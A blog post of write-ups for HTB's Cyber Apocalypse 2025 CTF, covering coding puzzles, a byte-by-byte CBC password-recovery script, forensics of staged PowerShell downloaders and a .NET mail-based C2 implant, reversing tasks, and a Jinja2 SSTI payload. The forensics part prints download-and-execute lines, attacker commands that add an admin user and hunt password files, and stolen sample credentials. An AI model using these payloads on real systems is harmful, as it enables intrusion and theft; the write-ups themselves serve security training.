---
author: "pshegger"
title: "Cyber Apocalypse 2025"
date: "2025-04-16"
description: "Writeups from HTB's Cyber Apocalypse CTF 2025: Tales from Eldoria"
tags: ["ctf", "writeup", "cryptography", "python", "forensics", "reversing", "template injection"]
categories: [ "ctf" ]
---

# Coding
## Summoners Incantation

It is a fairly simple task. The aim is to choose a number of `tokens` with the maximum possible sum. The twist is that we cannot use a token next to one that we've already chosen.

To solve it, we can create a recursive search with the following constraints:

1. if there are no tokens left, the max sum is `0`
2. if there's one token left, the max sum is the value of that token
3. otherwise, we can check the first two tokens to decide which one we should use
	- we take the `1st` one and call the recursive function with the remaining ones (making sure to remove the `2nd` token, since that's the neighbor we cannot use)
	- repeat previous step with the `2nd` token; now we have to remove the `1st` and `3rd` tokens
	- choose the one that has the higher sum

```python
def find_max_energy(tokens):
    if len(tokens) == 0:
        return 0
    elif len(tokens) == 1:
        return tokens[0]
    e1 = tokens[0] + find_max_energy(tokens[2:])
    e2 = tokens[1] + find_max_energy(tokens[3:])
    return max(e1, e2)

input_text = input()
tokens = [int(t) for t in input_text[1:-1].split(',')]

print(find_max_energy(tokens))
```

## Dragon Fury

For this task, we get a `2d array` that contains possible "damage values" for rounds, and a `target` we need to reach. Our aim is to select a single value for each round in a way that adds up to our target in the end.

We can once again use a recursive search to itarate over all possible combinations. For the first `n-1` rounds, we can simply take all the possible values, and call our function with that round removed from the list of rounds. In the last round we have to check whether the possible values contain the remaining target. If it does, we have our solution, otherwise, we can backtrack to a previous state to try that.

```python
def find_damages(damages, target):
    if len(damages) == 0:
        return []
    elif len(damages) == 1:
        if target in damages[0]:
            return [target]
        else:
            return []
    for i in range(len(damages[0])):
        dmg = damages[0][i]
        trial = find_damages(damages[1:], target - dmg)
        if len(trial) == len(damages) - 1:
            return [dmg] + trial
    return []

input_text = input()
target = int(input())

damages = eval(input_text)
print(find_damages(damages, target))
```

## Enchanted Cipher

This task is a weird version of `rot13`. Here's how it works:

- the input is split into 5-character-long groups
- a random shift amount (`1`-`25`) is selected for each group
- the characters in a given group are shifted by the selected amount

Knowing only this, it could be a challenge to decrypt the message, but we also get the `random shifts` as our input. That knowledge makes this task trivial. All we have to do is iterate over the characters, deciding which group it belongs to, and shifting it back by the known amount.

```python
def shift_back(ch, s):
    n = ord(ch) - s
    if n < ord('a'):
        n += 26
    return chr(n)

encrypted = input()
groups = int(input())
shifts = eval(input())

ctr = 0
decrypted = ''
for ch in encrypted:
    if ord('a') <= ord(ch) <= ord('z'):
        decrypted += shift_back(ch, shifts[ctr // 5])
        ctr += 1
    else:
        decrypted += ch

print(decrypted)
```

## Dragon Flight

For this task, we need to do 3 things:

1. keep a list of wind effects for each path segment
2. update the list when we get a command starting with `U`
3. print the [maximum subarray](https://en.wikipedia.org/wiki/Maximum_subarray_problem) for the given segments (command `Q`)

Since the inputs are really small, we can simply brute-force the max sum.

```python
n, q = [int(x) for x in input().split(' ')]
wind = [int(x) for x in input().split(' ')]

for i in range(q):
    inp = input()
    o, p1, p2 = inp.split(' ')
    p1 = int(p1)
    p2 = int(p2)
    if o == 'U':
        wind[p1 - 1] = p2
    elif o == 'Q':
        m = wind[p1 - 1]
        for j in range(p1 - 1, p2):
            for k in range(j, p2):
                if sum(wind[j:k+1]) > m:
                    m = sum(wind[j:k+1])
        print(m)
```

## ClockWork Guardian

Classic path-finding task. We need to get from the start position (`(0,0)`) to the exit (marked with `E`) while avoiding the sentinels (marked with `1`). We can simply implement [Dijkstra's Algorithm](https://en.wikipedia.org/wiki/Dijkstra%27s_algorithm), to determine the distance of any point from the start. Once we have the distances, we just have to find the exit and print the value.

```python
input_text = input()

def are_neighbors(u, v):
    horizontal = (u[0] == v[0] - 1 or u[0] == v[0] + 1) and u[1] == v[1]
    vertical = (u[1] == v[1] - 1 or u[1] == v[1] + 1) and u[0] == v[0]
    return horizontal or vertical

def dijkstra(maze, start):
    dist = {}
    prev = {}
    q = []
    for y in range(len(maze)):
        for x in range(len(maze[y])):
            dist[(x, y)] = 10000
            prev[(x, y)] = None
            if maze[y][x] != 1:
                q.append((x, y))
    dist[start] = 0

    while len(q) > 0:
        u = q[0]
        for v in q:
            if dist[v] < dist[u]:
                u = v
        q.remove(u)
        for v in q:
            if not are_neighbors(u, v):
                continue
            alt = dist[u] + 1
            if alt < dist[v]:
                dist[v] = alt
                prev[v] = u
    return dist, prev

maze = eval(input_text)
dist, prev = dijkstra(maze, (0, 0))

for y in range(len(maze)):
    for x in range(len(maze[0])):
        if maze[y][x] == 'E':
            print(dist[(x, y)])
            break
```

# Crypto

## Hourcle

Since we get access to the source code of the encryption, we can check how the encryption is implemented.

```python
def encrypt_creds(user):
    padded = pad((user + password).encode(), 16)
    IV = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv=IV)
    ciphertext = cipher.decrypt(padded)
    return ciphertext
```

Looking at the `encrypt_creds` function, we can see two issues:

1. the unknown `password` is concatenated to the user-provided `username`
2. it uses the `decrypt` method instead of `encrypt`

The consequences become obvious once we check the difference between `decrypt` and `encrypt` ([CBC on Wikipedia](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC))): the last step of decryption is a `xor` operation, and it uses the previous block as one of the operands. Since we can control (part of) the input, we can freely select this block by using a carefully crafted input.

To recover the password, we need to construct our `username` in a way, that will result in a part of it being the same as the end, where the password is automatically appended.

### Attack Explanation
Let's see an example with a shorter password (`4` characters) and block size (`8` bytes): `00000000 0000000c 00000000 0000000p ppp_____`. This is the result of the following:

- the `1st` block is a known value (`0s` in this case, but any value should do)
- the `2nd` block also starts with known values, but the last character is something different (`c`)
- the `3rd` block is the same as the first one
- the `4th` block begins the same way as our `2nd`, but ends with the first character of the `password`
- the last block is the remainder of the password (+ some extra padding), but it's not important for us

Keep in mind, that this is the final, _complete_, value that will be passed to `cipher.decrypt`. The `username` provided by us, actually ends with the last `0` (just before the first `p`). So, what does this mean? Let's see, what happens with each block:

- `1st`: decrypted with `KEY` and `xored` together with a random `IV`
- `2nd-5th`: decrypted with `KEY` and `xored` together with the previous (plain-text) block

The key is the same for each block, and we made sure that blocks `1` & `3` are the same. This means, that the decrypted result for blocks `2` and `4` will be the same, if `c` and `p` is the same at the end. This means that we can iterate over each possible character (as a value of `c`) to find the first character of the password. Once we have that, we can just remove a `0` from the `2nd` block, do the same with the `4th` block, and start cracking the `2nd` character of the password.

### Implications of this Attack

This attack significantly decreases the search space. If we tried to crack the original password, we would've needed `62^20 = 7*10^35` tries. Since we're now cracking each character one-by-one, the search space is reduced to `62*20 = 1240`, making it feasable.

### Final Code

There's one more thing we need to keep in mind for the actual task. In the example above, we had a password that was shorter than the block size, which is not the case for the actual task. Luckily, this is not that big of a change, we just need to expand our `2nd` & `4th` blocks to be longer than the password itself (so, in the actual task, the `2nd` is shifted to be the `3rd` one, and an extra padding block is added before it; the same thing should happen with the `4th` block).

```python
#!/usr/bin/env python3

from pwn import *

PWD_LENGTH = 20

def send_value(conn, type, value):
    for i in range(11):                             # skip the menu
        conn.recvline().decode('utf-8').strip()
    conn.send(f"{type}\n".encode())                 # send menu selection
    conn.recvline()
    conn.send(f"{value}\n".encode())                # send value
    l = conn.recvline().decode('utf-8').strip()     # receive response
    return l.split()[-1]

def recover_password(conn):
    recovered = ""
    while len(recovered) < PWD_LENGTH:
        for c in string.ascii_letters + string.digits:
            username = '0' * 16                                             # known cipher block
            username += '0' * (32 - len(recovered) - 1) + recovered + c     # 0-padding + recovered password + searched char (2 blocks)
            username += '0' * 16                                            # same as first block
            username += '0' * (32 - len(recovered) - 1)                     # same beginning as block 2-3, password will be appended, adding the first `n` chars to the block end
            enc = send_value(conn, 1, username)
            if enc[32:96] == enc[128:192]:
                print(f"{len(recovered) + 1}/{PWD_LENGTH}: {c}")
                recovered += c
                break
    return recovered

conn = remote('83.136.254.234', 56453)

password = recover_password(conn)
print(f"Recovered password: {password}")
print(send_value(conn, 2, password))
```

# Forensics

## Thorin's Amulet
### Stage 1

At the beginning of this task, we are presented with a `PowerShell` script.

```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

The script defines a method and calls it. The method itself spawns a new `powershell.exe` process to execute an encrypted command. The used encryption is only `Base64`, so we can easily decrypt it to get the following code:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

This command downloads some code from `http://korp.htb/update`, and executes it, using `IEX`

### Stage 2

If we visit the `URL` above, we will find the following script:

```powershell
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

Once again, it downloads a `.ps1` file and executes it. This time we need to make sure to include the header to get the correct script.

### Stage 3

The last script is completely harmless, we can simply run it to get the flag.

```powershell
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```

## A New Hire

### Stage 1

At the beginning, we get access to a `.eml` (`Electronic Mail`) file. It contains a link to a "resume". Opening the link redirects us to a new page, where we can download a file called `Resume.pdf .lnk`.

### Stage 2

If we check the content of this `shortcut file`, we will see, that it's starting `PowerShell` with a `Base64` encrypted command. Once we decrypt it, we get the following:

```powershell
[System.Diagnostics.Process]::Start('msedge', 'http://storage.microsoftcloudservices.com:37974/3fe1690d955e8fd2a0b282501570e1f4/resumesS/resume_official.pdf');\\storage.microsoftcloudservices.com@37974\3fe1690d955e8fd2a0b282501570e1f4\python312\python.exe \\storage.microsoftcloudservices.com@37974\3fe1690d955e8fd2a0b282501570e1f4\configs\client.py
```

This command does 2 things:

1. opens `resume_official.pdf` in Microsoft Edge; not important for use right now
2. runs a remote `python` script called `client.py`

### Stage 3

`client.py` contains an encrypted payload and an encryption key. Since the key is only encrypted with `Base64`, we can decrypt it, and we will be presented with the flag.

## Silent Trap

For this task, we get access to a capture file, that we need to analyse to answer multiple questions.

### Flag 1

We need to figure out the subject of the first email the victim opened. We can do it by following these steps:

1. open the capture file in `wireshark`
2. filter for `HTTP` communicaiton
3. find the first packet that looks like an mailbox, and has the `_get` action
4. `Right Click` -> `Follow` -> `TCP Stream`

Once done with the above steps, we will see the source code of the rendered `HTML` page. All we need now is finding the subject and submitting it as the flag.

### Flag 2

For the second flag, we need to figure out the date the malicious email was sent. While looking at the packets, we can find, that the victim has downloaded a zip file. We can assume that it contained the malware, so we need to look for an email that contains a `.zip` attachment. Once we have it, we can repeat the steps from `Flag 1` to get the whole `HTML` page, and get the date.

```html
<div class="header-summary">
  <span>From <span class="adr">
      <a href="mailto:proplayer@email.com" class="rcmContactAddress" onclick="return rcmail.command('compose','proplayer@email.com',this)" title="proplayer@email.com">proplayer@email.com</a>
      <a href="#add" title="Add to address book" class="rcmaddcontact" onclick="return rcmail.command('add-contact','proplayer@email.com',this)"></a>
    </span> on <span class="text-nowrap">2025-02-24 15:46</span>
  </span>
</div>
```

### Flag 3

Next, we need to figure out the `MD5` hash of the malware file.

We can start by donwloading the `.zip` file ourselves. We can use `Wireshark's` export functionality (`File` -> `Export Objects` -> `HTTP`). Once we have the file, we need to extract it, but that requires a password. We can check the `HTML` page from the previous flag to get it.

```bash
┌──(.venv)─(pshegger㉿suki)-[~/…/ctf/2025/CyberApocalypse/silent_trap]
└─$ 7z x Eldoria_Balance_Issue_Report.zip  

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=C.UTF-8 Threads:8 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 7898 bytes (8 KiB)

Extracting archive: Eldoria_Balance_Issue_Report.zip
--
Path = Eldoria_Balance_Issue_Report.zip
Type = zip
Physical Size = 7898

Enter password (will not be echoed):
Everything is Ok

Size:       18944
Compressed: 7898

┌──(.venv)─(pshegger㉿suki)-[~/…/ctf/2025/CyberApocalypse/silent_trap]
└─$ md5sum Eldoria_Balance_Issue_Report.pdf.exe 
c0b37994963cc0aadd6e78a256c51547  Eldoria_Balance_Issue_Report.pdf.exe
```

### Flag 4

The next task is finding the credentials the malware uses for authentication to an `IMAP` server.

If we inspect the binary, we can find, that it's a `.NET` executable, so we can use a decompiler to see the source code. There are multiple options for that, for example: [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy). Once the program is decompiled, we can quickly find a variable named `creds`, that contains the credentials.

```c#
static Program()
	{
		string[] obj = new string[5]
		{
			Environment.MachineName,
			"_",
			Environment.UserName,
			"_",
			null
		};
		int num = 4;
		obj[num] = Environment.OSVersion?.ToString();
		comp_id = Base64Encode(string.Concat(obj));
		creds = "proplayer@email.com:completed:mail.korptech.net:0000000000000000000000000000000000000000000000000000000";
		r_creds = "proplayer1@email.com:completed:mail.korptech.net:000000000000000000000000000000000000000000000000000000000";
		ssl = null;
		tcp = null;
	}
```

If we look further, we can also find a call to the `Login` method, that shows us how to parse this variable.

```c#
Login(creds.Split(new char[1] { ':' })[0], creds.Split(new char[1] { ':' })[1]);
```

### Flag 5

The next flag is the name of a scheduled task. To find it we need to dig deepet into the source code.

Starting from the `Main` method, we can find, that a function called `readFile` is called periodically, and the returned value is then executed as a system command. This means that this is how the malware receives commands from the `C2 server`.

```c#
private static string[] readFile()
{
	connect(creds.Split(new char[1] { ':' })[2], 143);
	Login(creds.Split(new char[1] { ':' })[0], creds.Split(new char[1] { ':' })[1]);
	try
	{
		selectFolder("Drafts");
	}
	catch
	{
		selectFolder("INBOX.Drafts");
	}
	string[] array = searchMessages(comp_id);
	if (array.Length == 0)
	{
		return new string[0];
	}
	string message_number = array[^1];
	string text = "";
	for (int i = 0; i < array.Length; i++)
	{
		byte[] bytes = xor(Convert.FromBase64String(getMessage(message_number)));
		text = Encoding.UTF8.GetString(bytes);
	}
	string[] array2 = new string[0];
	string[] array3 = text.Split(new char[1] { '\n' });
	foreach (string text2 in array3)
	{
		if (!text2.Contains(" OK") && text2.Length > 1)
		{
			Array.Resize(ref array2, array2.Length + 1);
			array2[^1] = text2.Trim(new char[1] { '\r' }).Trim(new char[1] { ')' });
		}
	}
	return array2;
}
```

The code above does the following:

1. search for specific messages in the `Drafts` folder
2. downoad the message body
3. decode it with a custom `xor` method and convert it to `UTF-8`

To get the received commands, we need to go back to `Wireshark`. We can start by filtering for communications that happened over port `143` (`tcp.port == 143`). Once we found a message that looks like one of the command, we can figure out a stricter filter to only see those messages (`tcp.port == 143 and _ws.col.protocol == "IMAP/IMF"`). Once we have all the commands, we still need to decode them. Looking at the `xor` implementation in the decompiled malware, we can find both the used method and key.

```python
#!/usr/bin/env python

import base64

pwd = [168, 115, ..., 58, 159]

def decrypt(data):
    data = base64.standard_b64decode(data)
    array = [pwd[i % len(pwd)] for i in range(256)]
    array2 = list(range(256))
    array3 = bytearray(len(data))
    num = 0
    for i in range(256):
        num = (num + array2[i] + array[i]) % 256
        array2[i], array2[num] = array2[num], array2[i]

    num3 = num = 0
    for i in range(len(data)):
        num3 = (num3 + 1) % 256
        num = (num + array2[num3]) % 256
        array2[num3], array2[num] = array2[num], array2[num3]
        num4 = array2[(array2[num3] + array2[num]) % 256]
        array3[i] = data[i] ^ num4
    return bytes(array3).decode('utf-8')

commands = [
    'bmmDXtPNDyr4vZ8E',
    'bWCfVNLNXHGo4IA=',
    # ...SNIP...
	'dG6eWp7nFVnqrpUZKmmZDQnlW57poAgaNcqAyaTqgA==',
]

for cmd in commands:
    print(decrypt(cmd))
```

When we run this script, we will get the following output:

```bash
┌──(.venv)─(pshegger㉿suki)-[~/…/ctf/2025/CyberApocalypse/silent_trap]
└─$ python decrypt_commands.py
whoami /priv
tasklist /v
wmic qfe get Caption,Description,HotFixID,InstalledOn
schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM
net user devsupport1 P@ssw0rd /add
net localgroup Administrators devsupport1 /add
net localgroup Administrators devsupport1 /add
reg query HKLM /f "password" /t REG_SZ /s
dir C:\ /s /b | findstr "password"
dir C:\ /s /b | findstr "password"
more "C:\Users\dev-support\AppData\Local\BraveSoftware\Brave-Browser\User Data\ZxcvbnData\3\passwords.txt"
```

### Flag 6

Our last task is to figure out what was the `API` key, that was extracted by the attacker. To find it, we need to go back to the malware first, and figure out how it's sending the output back to the `C2 server`. We will find a method called `create`, that receives the encrypted output as parameter.

```c#
private static void create(string text)
{
	text = "From: " + Environment.UserName + "\r\nSubject: " + DateTime.UtcNow.ToString() + "_report_" + comp_id + "\r\n\r\n" + text;
	int length = text.Length;
	byte[] bytes = Encoding.ASCII.GetBytes("$ APPEND Inbox {" + length + "}\r\n" + text + "\r\n");
	Task.Factory.FromAsync(ssl.BeginWrite, ssl.EndWrite, bytes, 0, bytes.Length, ssl);
}
```

Looking at the code, we can see that `text` becomes the body of a new message, that is then added to `Inbox`. We can use the `APPEND` command to filter the packets in `Wireshark` (`_ws.col.info contains "Request: $ APPEND Inbox"`). The last packet is the one we're looking for. We can use the script from the previous flag to decrypt the body and get the following output:

```
Microsoft Windows [Version 10.0.19045.5487]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dev-support\Desktop>more C:\backups\credentials.txt
[Database Server]
host=db.internal.korptech.net
username=dbadmin
password=rY?ZY_65P4V0

[Game API]
host=api.korptech.net
api_key=sk-3498fwe09r8fw3f98fw9832fw

[SSH Access]
host=dev-build.korptech.net
username=devops
password=BuildServer@92|7Gy1lz'Xb
port=2022

C:\Users\dev-support\Desktop>
```

# Reversing

## SealedRune

As a first step, we need to open the binary in a reverse engineering tool, such as [Ghidra](https://ghidra-sre.org/). If we go through the defined methods, we will find once called `decode_flag`. It is a fairly simple method, doing the following steps:

1. loads the flag from program data
2. calls a method called `base64_decode` on it
3. calls a method called `reverse_str` on the result of `step 2`

Since the flag is loaded from the program data, we can use `Ghidra's` string search functionality to find it. Once we have it, we can easily decode it:

```bash
$ echo 'LmB9ZDNsNDN2M3JfYzFnNG1fM251cntCVEhgIHNpIGxsZXBzIHRlcmNlcyBlaFQ=' | base64 -d | python -c "print(input()[::-1])"
The secret spell is `HTB{run3_m4g1c_r3v34l3d}`.
```

## EncryptedScroll

Once again, we start by opening the binary in `Ghidra`, and looking for a suspicious method. This time, we will find `decrypt_message`:

```c
int local_3c;
undefined8 local_38;
undefined4 local_30;
undefined4 uStack_2c;
undefined4 uStack_28;
undefined8 local_24;
long local_10;

local_10 = *(long *)(in_FS_OFFSET + 0x28);
local_38 = 0x716e32747c435549;
local_30 = 0x6760346d;
uStack_2c = 0x6068356d;
uStack_28 = 0x75327335;
local_24 = 0x7e643275346e69;
for (i = 0; *(char *)((long)&local_38 + (long)i) != '\0'; i = i + 1) {
	*(char *)((long)&local_38 + (long)i) = *(char *)((long)&local_38 + (long)i) + -1;
}
iVar1 = strcmp(param_1,(char *)&local_38);
if (iVar1 == 0) {
	puts("The Dragon\'s Heart is hidden beneath the Eternal Flame in Eldoria.");
}
```

In order to get back the flag, we need to first understand what's happening here. The most important part is the `*(char *)((long)&local_38 + (long)i)` pointer magic. Let's look at it step-by-step:

- `(long)&local_38`: get the memory address of `local_38` and convert it to `long`
- ` + (long)i`: convert `i` to `long` and add it to the previous memory address
- `*(char *)`: convert the value at the calculated addres to `char`

This is basically the same as `local_38[i]`, with one difference. Since this is a `C` string, it should be `null` terminated, but it's not. This means, that once we reach the end of `local_38`, our loop will continue with the next memory address on the stack, and will do it as long as, it's not a `null` byte. Luckily, we also know the next values on the stack (`locacal_30`, `uStack_2c`, `uStack_28`, `local_24`, `local_10`). Since we know all the required values, we can write a script to get the flag (don't forget the `+ -1` part in the original program).

```python
>> stack = ['716e32747c435549', '6760346d', '6068356d', '75327335', '7e643275346e69']
>>> ''.join(''.join(chr(b-1) for b in bytes.fromhex(s))[::-1] for s in stack)
'HTB{s1mpl3_fl4g_4r1thm3t1c}'
```

# Web

## Trial by Fire

We get the source code for a web application written in `Python`, using `Flask` as `Jinja2` templating. If we go through the source code, we can find that the `/battle-report` endpoint is using `render_template_string`, which is known to be vulnerable to `Server-Side Template Injection` (`SSTI`). Since the received data is not sanitized, we can simply write our payload to get the content of the flag.

```python
{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```

We can also write a script to post our data directly to the vulnerable page (or even expand it for a semi-interactive shell):

```python
#!/usr/bin/env python3

import requests

URL = "http://83.136.250.155:54814"
PAYLOAD = "{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"

def submit_battle_report():
    data = {
        "damage_dealt": PAYLOAD,
        "damage_taken": 100,
        "spells_cast": 0,
        "turns_survived": 3,
        "outcome": "defeat",
        "battle_duration": 20.714
    }
    headers = { "Content-Type": "application/x-www-form-urlencoded" }
    return requests.post(f"{URL}/battle-report", data=data, headers=headers)

def extract_result(html):
    for l in html.split('\n'):
        if "Damage Dealt:" in l:
            return l.strip()[54:-11]

print(extract_result(submit_battle_report().text))
```